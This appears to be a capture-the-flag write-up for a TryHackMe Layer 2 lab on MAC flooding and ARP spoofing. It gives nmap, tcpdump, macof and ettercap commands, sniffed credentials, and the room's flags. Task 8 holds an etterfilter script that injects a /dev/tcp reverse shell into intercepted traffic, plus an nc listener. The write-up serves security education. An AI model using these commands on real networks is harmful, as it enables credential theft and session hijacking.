# L2 MAC Flooding & ARP Spoofing

{% embed url="https://tryhackme.com/room/layer2" %}
https://tryhackme.com/room/layer2
{% endembed %}

## Task 2 Initial Access

#### Now, can you (re)gain access?

```bash
ssh -o StrictHostKeyChecking=accept-new admin@10.10.29.38
```

{% hint style="success" %}
`Yay`
{% endhint %}

## Task 3 Network Discovery

#### What is your IP address?

```bash
ip a show eth1
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 04-54-54.png>)

{% hint style="success" %}
`192.168.12.66`
{% endhint %}

#### What's the network's CIDR prefix?

{% hint style="success" %}
`/24`
{% endhint %}

#### How many other live hosts are there?

```bash
sudo nmap -n -sn --exclude 192.168.12.66 192.168.12.0/24 -oG - \
| awk '/Up$/{print $2}' | tee host.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 04-59-45.png>)

{% hint style="success" %}
`2`
{% endhint %}

#### What's the hostname of the first host (lowest IP address) you've found?

```bash
cat /etc/hosts
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 05-45-52.png>)

{% hint style="success" %}
`alice`
{% endhint %}

## Task 4 Passive Network Sniffing

#### Can you see any traffic from those hosts?

```bash
sudo tcpdump -i eth1
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 05-48-11.png>)

{% hint style="success" %}
`Yay`
{% endhint %}

#### Who keeps sending packets to eve?

{% hint style="success" %}
`bob`
{% endhint %}

#### What type of packets are sent?

{% hint style="success" %}
`ICMP`
{% endhint %}

#### What's the size of their data section?

```bash
sudo tcpdump -i eth1 -w /tmp/tcpdump.pcap
```

```bash
scp admin@10.10.29.38:/tmp/tcpdump.pcap .
wireshark tcpdump.pcap
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 05-51-36.png>)

{% hint style="success" %}
`666`
{% endhint %}

## Task 5 Sniffing while MAC Flooding

#### What kind of packets is Alice continuously sending to Bob?

```bash
sudo tcpdump -i eth1 -w /tmp/tcpdump2.pcap
```

```bash
sudo macof -i eth1
```

```bash
scp admin@10.10.29.38:/tmp/tcpdump2.pcap .
wireshark tcpdump2.pcap
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 05-59-59.png>)

{% hint style="success" %}
`ICMP`
{% endhint %}

#### What's the size of their data section?

{% hint style="success" %}
`1337`
{% endhint %}

## Task 6 Man-in-the-Middle: Intro to ARP Spoofing

#### Can ettercap establish a MITM in between Alice and Bob?

```bash
sudo ettercap -T -i eth1 -M arp
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-03-24.png>)

{% hint style="success" %}
`Nay`
{% endhint %}

#### Would you expect a different result when attacking hosts without ARP packet validation enabled?

{% hint style="success" %}
`Yay`
{% endhint %}

## Task 7 Man-in-the-Middle: Sniffing

#### Scan the network on eth1. Who's there?

```bash
ssh -o StrictHostKeyChecking=accept-new admin@10.10.179.30
sudo nmap -n -sn --exclude 192.168.12.66 192.168.12.0/24 -oG - \
| awk '/Up$/{print $2}' | tee host.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-26-16.png>)

{% hint style="success" %}
`192.168.12.20, 192.168.12.10`
{% endhint %}

#### Which machine has an open well-known port?

```bash
sudo nmap -n -sV 192.168.12.10,20
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-30-40.png>)

{% hint style="success" %}
`192.168.12.20`
{% endhint %}

#### What is the port number?

{% hint style="success" %}
`80`
{% endhint %}

#### Can you access the content behind the service from your current position?

{% hint style="success" %}
`Nay`
{% endhint %}

#### Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1?

```bash
sudo tcpdump -i eth1 -w /tmp/tcpdump.pcap
```

{% hint style="success" %}
`Nay`
{% endhint %}

#### Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now?

```bash
sudo ettercap -T -i eth1 -M arp
```

{% hint style="success" %}
`Yay`
{% endhint %}

#### Who is using that service?

```bash
scp admin@10.10.135.196:/tmp/tcpdump.pcap .
wireshark tcpdump.pcap
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-39-36.png>)

{% hint style="success" %}
`alice`
{% endhint %}

#### What's the hostname the requests are sent to?

{% hint style="success" %}
`www.server.bob`
{% endhint %}

#### Which file is being requested?

{% hint style="success" %}
`test.txt`
{% endhint %}

#### What text is in the file?

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-40-01.png>)

{% hint style="success" %}
`OK`
{% endhint %}

#### Which credentials are being used for authentication?

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-42-10.png>)

{% hint style="success" %}
`admin:s3cr3t_P4zz`
{% endhint %}

#### Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?

{% hint style="success" %}
`RE-ARPing the victims`
{% endhint %}

#### Can you access the content behind that service, now, using the obtained credentials?

```bash
curl -u admin:s3cr3t_P4zz http://192.168.12.20
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-46-59.png>)

{% hint style="success" %}
`Yay`
{% endhint %}

#### What is the user.txt flag?

```bash
curl -u admin:s3cr3t_P4zz http://192.168.12.20/user.txt
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-48-25.png>)

{% hint style="success" %}
`THM{wh0s_$n!ff1ng_0ur_cr3ds}`
{% endhint %}

#### You should also have seen some rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-51-20.png>)

{% hint style="success" %}
`reverse shell`
{% endhint %}

#### What commands are being executed? Answer in the order they are being executed.

![](<../../.gitbook/assets/Screenshot from 2022-05-03 06-53-35.png>)

{% hint style="success" %}
`whoami, pwd, ls`
{% endhint %}

#### Which of the listed files do you want?

{% hint style="success" %}
`root.txt`
{% endhint %}

## Task 8 Man-in-the-Middle: Manipulation

#### What is the root.txt flag?

```bash
sudo ufw allow in on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 07-02-06.png>)

```bash
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
    log(DATA.data, "/root/ettercap.log");
    replace("whoami", "sh -i >& /dev/tcp/192.168.12.66/6666 0>&1");
    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");
}
```

```bash
etterfilter whoami.ecf -o whoami.ef
sudo ettercap -T -i eth1 -M arp -F whoami.ef
```

```bash
nc -nvlp 6666
```

![](<../../.gitbook/assets/Screenshot from 2022-05-03 07-03-40.png>)

{% hint style="success" %}
`THM{wh4t_an_ev1l_M!tM_u_R}`
{% endhint %}
